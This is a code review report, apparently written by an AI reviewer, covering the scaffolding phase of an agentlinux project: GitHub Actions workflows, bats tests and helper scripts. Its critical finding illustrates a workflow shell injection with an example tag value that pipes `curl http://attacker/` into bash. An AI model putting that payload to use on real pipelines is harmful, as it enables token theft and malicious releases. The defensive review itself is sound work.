---
phase: 01-harness-setup
created: 2026-04-18T11:09:35Z
reviewed: 2026-04-18T11:09:35Z
depth: standard
files_reviewed: 20
files_reviewed_list:
  - plugin/bin/agentlinux-install
  - plugin/cli/scripts/validate-catalog.mjs
  - plugin/cli/biome.json
  - plugin/cli/package.json
  - plugin/cli/tsconfig.json
  - plugin/cli/stryker.config.json
  - plugin/catalog/schema.json
  - .pre-commit-config.yaml
  - .github/workflows/test.yml
  - .github/workflows/nightly-qemu.yml
  - .github/workflows/nightly-mutation.yml
  - .github/workflows/release.yml
  - tests/mutation/bash-mutator.sh
  - tests/harness/run.sh
  - tests/harness/00-layout.bats
  - tests/harness/10-claude-md.bats
  - tests/harness/20-precommit.bats
  - tests/harness/30-workflows.bats
  - tests/harness/40-adrs-and-research.bats
  - tests/harness/50-agents-and-skills.bats
  - tests/harness/60-mutation-scaffolding.bats
findings:
  critical: 1
  warning: 4
  info: 6
  total: 11
status: issues_found
---

# Phase 1: Code Review Report

**Reviewed:** 2026-04-18T11:09:35Z
**Depth:** standard
**Files Reviewed:** 20
**Status:** issues_found

## Summary

Phase 1 is a scaffolding phase: all reviewed files are intentionally minimal
(stub installer, zero-dep validator, workflow skeletons guarded by
`hashFiles(...)`/`compgen` checks, bats harness for the spec's HRN-XX
requirements). All shell scripts pass `bash -n`; all YAML parses; all JSON is
well-formed. The harness-only scope was respected consistently — no secrets,
no dangerous `eval`/`innerHTML`, no `curl | bash` without SHA verification.

One **Critical** issue: the release workflow interpolates `inputs.tag` directly
into bash scripts via `${{ ... }}`, which is a well-known GitHub Actions shell
injection sink (tag input is actor-controlled via `workflow_dispatch`). This
must be fixed before any real release script lands in Phase 6, because the
current pattern would carry forward.

Four **Warnings** relate to: (1) the release placeholder emits an invalid
tarball whose publish step is only guarded by ref-prefix (not by "real build
succeeded"); (2) the `10-claude-md.bats` test claims to verify that CLAUDE.md
"forbids `sudo npm install -g`" but uses a literal-substring grep that would
pass even if the file *recommended* the pattern; (3) `validate-catalog.mjs`
dereferences `a.name` before validating it exists in two places; (4)
`run.sh` expands `"$HERE"/*.bats` unquoted-glob-style and will pass a literal
`*.bats` string to bats if the directory is ever empty.

## Critical Issues

### CR-01: Shell injection via `${{ inputs.tag }}` in release.yml

**File:** `.github/workflows/release.yml:26,29,35,39,40`
**Issue:** The `workflow_dispatch` input `tag` is pasted directly into shell
snippets through GitHub Actions' `${{ ... }}` expression interpolation. This
happens *before* bash sees the script, so bash-level quoting (`"..."`) does
not protect it. A malicious tag value such as
`v0.3.0"; curl http://attacker/ | bash; echo "` expands to a syntactically
valid script that exfiltrates `GITHUB_TOKEN` (the job has `contents: write`)
and can publish arbitrary releases. Although `workflow_dispatch` requires
repo-write access to trigger, this is a well-known GHA hardening anti-pattern
and would be inherited by the real Phase-6 release script.

**Fix:** Pass the input through the environment, which GH Actions
escapes safely, then read it as a normal shell variable:

```yaml
- name: Resolve tag
  id: tag
  env:
    INPUT_TAG: ${{ inputs.tag }}
  run: |
    if [[ -n "$INPUT_TAG" ]]; then
      echo "value=$INPUT_TAG" >> "$GITHUB_OUTPUT"
    else
      echo "value=${GITHUB_REF##*/}" >> "$GITHUB_OUTPUT"
    fi

- name: Build release tarball
  id: build
  env:
    TAG: ${{ steps.tag.outputs.value }}
  run: |
    if [[ -x scripts/build-release.sh ]]; then
      bash scripts/build-release.sh "$TAG"
    else
      echo "scripts/build-release.sh not present yet — Phase 6 lands it."
      mkdir -p dist
      echo "placeholder" > "dist/agentlinux-${TAG}.tar.gz"
      sha256sum "dist/agentlinux-${TAG}.tar.gz" > "dist/agentlinux-${TAG}.tar.gz.sha256"
    fi
```

Also validate the tag shape (`[[ "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]`)
before using it in filenames — this prevents path-traversal in `dist/` and
gives defence-in-depth if the env-var escape is ever regressed.

## Warnings

### WR-01: release.yml publishes a non-tarball placeholder when build script is missing

**File:** `.github/workflows/release.yml:37-40,42-48`
**Issue:** When `scripts/build-release.sh` is absent, the workflow writes the
literal string `"placeholder\n"` to `dist/agentlinux-${TAG}.tar.gz` and
publishes it via `softprops/action-gh-release` whenever the trigger is a
`refs/tags/v*` push. That is *not* a valid gzipped tarball — any user who
runs `tar -xzf` against it gets a decompression error, and the sibling
`.sha256` checksum matches a bogus artifact. Phase 1 is a scaffolding phase,
so no real tag push is expected, but the branch is load-bearing: if anyone
cuts `v0.3.0-alpha` before Phase 6 ships the build script, the release will
look successful on GitHub while being broken for users.

**Fix:** Fail the workflow (not silently fake a release) when the build
script is missing and the ref is a tag:

```yaml
- name: Build release tarball
  id: build
  env:
    TAG: ${{ steps.tag.outputs.value }}
  run: |
    if [[ -x scripts/build-release.sh ]]; then
      bash scripts/build-release.sh "$TAG"
    elif [[ "$GITHUB_REF" == refs/tags/* ]]; then
      echo "::error::scripts/build-release.sh missing on a tag build — refusing to publish placeholder"
      exit 1
    else
      echo "Non-tag build and no build script — emitting placeholder for dry-run"
      mkdir -p dist
      : > "dist/agentlinux-${TAG}.tar.gz"
      sha256sum "dist/agentlinux-${TAG}.tar.gz" > "dist/agentlinux-${TAG}.tar.gz.sha256"
    fi
```

### WR-02: 10-claude-md.bats "forbids sudo npm install -g" is an anti-assertion that passes on the opposite text

**File:** `tests/harness/10-claude-md.bats:18-20`
**Issue:** The test name promises CLAUDE.md "forbids `sudo npm install -g`",
but the body is `grep -qi "sudo npm install -g" CLAUDE.md`. That passes for
any document that *mentions* the phrase — including `"Always use sudo npm
install -g"`. The live CLAUDE.md happens to use "Never `sudo npm install -g`
anywhere", so the test passes today, but refactoring CLAUDE.md to drop the
"Never" prefix would leave the test green while violating the spec. Given
this rule is the project's canonical "bug class we exist to eliminate" (per
CLAUDE.md §Critical Rules), the test should anchor to the prohibition.

**Fix:** Assert on the forbidding phrasing:

```bash
@test "HRN-03: CLAUDE.md forbids sudo npm install -g" {
  # Must appear in a prohibition context (Never / Avoid / Do not), not a recommendation
  grep -qEi "(never|avoid|do not|don't).{0,40}sudo npm install -g" CLAUDE.md
}
```

### WR-03: validate-catalog.mjs uses `a.name` in error messages before asserting it's a string

**File:** `plugin/cli/scripts/validate-catalog.mjs:30-34`
**Issue:** The name check `!a.name || !namePattern.test(a.name)` treats
`a.name === ""` and `a.name === undefined` as the same "falsy" case, which
is fine. But the immediately-following error messages on lines 33 and 34
(`agent ${a.name}: missing description`, `agent ${a.name}: missing install`)
interpolate `a.name` without ever validating that the preceding loop
iteration had a valid name — if an agent is missing `description`, the error
reads `agent undefined: missing description`, which is actively misleading
when debugging a real catalog. Low-severity because this is the stub
validator, but the real ajv swap in Phase 4 should not inherit the pattern.

**Fix:** Either skip later checks on a named-fail agent, or use a positional
identifier:

```js
for (const [i, a] of catalog.agents.entries()) {
  const id = a.name || `<agents[${i}]>`;
  if (!a.name || !namePattern.test(a.name)) {
    fail(`agent ${id}: name fails pattern ${namePattern}`);
  }
  if (!a.description) fail(`agent ${id}: missing description`);
  if (!a.install) fail(`agent ${id}: missing install`);
}
```

### WR-04: run.sh expands `"$HERE"/*.bats` and will hand bats the literal glob if the directory is empty

**File:** `tests/harness/run.sh:44`
**Issue:** `"$BATS_BIN" "$HERE"/*.bats` uses a bare glob — if `tests/harness/`
ever contains zero `.bats` files (e.g., during a refactor, or when copied
into a fresh project with this harness template), bash leaves the literal
string `tests/harness/*.bats` after expansion and passes it to bats, which
reports "file not found" with a confusing exit. Phase 1 ships seven `.bats`
files so this is latent, but the script is meant as a template that other
phases and external consumers copy. A `nullglob`-style guard makes the
failure mode explicit.

**Fix:**

```bash
shopt -s nullglob
bats_files=("$HERE"/*.bats)
shopt -u nullglob
if [[ ${#bats_files[@]} -eq 0 ]]; then
  echo "tests/harness/run.sh: no .bats files found in $HERE" >&2
  exit 2
fi
"$BATS_BIN" "${bats_files[@]}"
```

## Info

### IN-01: test.yml has no `concurrency` group — repeated pushes run duplicate pipelines

**File:** `.github/workflows/test.yml:20-80`
**Issue:** Every push to a feature branch triggers a fresh pipeline even if a
previous run is still in progress. On a busy repo this wastes CI minutes
and delays feedback on the latest commit.
**Fix:** Add at the top level:

```yaml
concurrency:
  group: test-${{ github.ref }}
  cancel-in-progress: true
```

### IN-02: nightly-mutation.yml swallows `bash` invocation failures in the bash-mutator step

**File:** `.github/workflows/nightly-mutation.yml:42-43`
**Issue:** `bash tests/mutation/bash-mutator.sh || echo "::warning::..."`
treats *any* non-zero exit — including `127` (file not found) or `2`
(syntax error) — as a "below target" warning. Combined with
`continue-on-error: true` on the job, a broken mutator would go unnoticed.
This is intentional given the advisory status documented in the phase
context, but worth narrowing when the mutator becomes a gate in v0.4.
**Fix (future):** Distinguish "mutator ran but kill-rate low" (expected
warning) from "mutator crashed/missing" (hard fail) with an explicit exit
code contract inside `bash-mutator.sh`.

### IN-03: bash-mutator.sh find filter may pick up non-bash executables

**File:** `tests/mutation/bash-mutator.sh:20-21`
**Issue:** The filter `\( -name "*.sh" -o -perm -u+x \)` matches any
executable file, not only bash scripts — future phases that drop a compiled
binary into `plugin/bin/` would have it treated as a mutation target. The
same loop then runs `bash -n` on it, which will fail noisily and (because
of `set -e`) abort the mutator. Phase 1 has only the bash stub, so this is
latent.
**Fix:** Either restrict to shebang-based detection (`head -c 128 "$f" | grep -q '^#!.*\(bash\|sh\)$'`)
or drop the `-perm -u+x` branch and rely only on `*.sh` naming once the
project convention is established.

### IN-04: release.yml `GITHUB_REF##*/` fallback is unreachable

**File:** `.github/workflows/release.yml:23-30`
**Issue:** `inputs.tag` has `required: true`, so the `[[ -n "${{ inputs.tag }}" ]]`
branch can never be false on a `workflow_dispatch`; and on a `push` tag
trigger the `inputs` context is empty, so the `else` branch always fires.
Net effect: the explicit `if` is dead logic that does exactly what the
`else` would already do.
**Fix (cosmetic):** Simplify to `echo "value=${INPUT_TAG:-${GITHUB_REF##*/}}" >> "$GITHUB_OUTPUT"`
inside an env-protected step (see CR-01 for the env-var version).

### IN-05: plugin/cli/scripts/validate-catalog.mjs hard-codes repo-root-relative paths

**File:** `plugin/cli/scripts/validate-catalog.mjs:7-8`
**Issue:** `SCHEMA_PATH` and `CATALOG_PATH` are literal relative strings
that only resolve correctly when Node's cwd is the repo root. pre-commit's
`language: system` hook inherits the repo-root cwd so this works today,
but the script cannot be invoked from elsewhere (e.g. `cd plugin/cli &&
node scripts/validate-catalog.mjs`) without silently failing its
"no catalog.json yet" branch. The TODO already earmarks an ajv rewrite for
Phase 4 — resolving paths relative to `import.meta.url` or to a
`git rev-parse --show-toplevel`-equivalent is worth rolling in then.
**Fix (Phase 4):**

```js
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '../../..');
const SCHEMA_PATH = resolve(REPO_ROOT, 'plugin/catalog/schema.json');
```

### IN-06: plugin/bin/agentlinux-install stub has no error trap — template risk for Phase 2+

**File:** `plugin/bin/agentlinux-install:1-5`
**Issue:** The stub correctly sets `set -euo pipefail` (per CLAUDE.md §Critical
Rules and `.claude/skills/agentlinux-installer/SKILL.md` requirement), but
has no `trap '...' ERR` or `trap '...' EXIT` handler. That's fine today
because the body is a single `echo` that cannot fail mid-way, but Phase 2
will extend this file into the real provisioner where partial-failure
cleanup matters. Landing the trap now (even as a no-op) signals the
convention to future changes.
**Fix:**

```bash
#!/usr/bin/env bash
# AgentLinux installer entrypoint (stub — real provisioning lands in Phase 2+).
set -euo pipefail

cleanup() {
  local rc=$?
  # Phase 2+: roll back partial provisioning here.
  exit "$rc"
}
trap cleanup EXIT

echo "agentlinux-install: stub entrypoint (harness phase); real installer arrives in Phase 2+"
```

---

_Reviewed: 2026-04-18T11:09:35Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
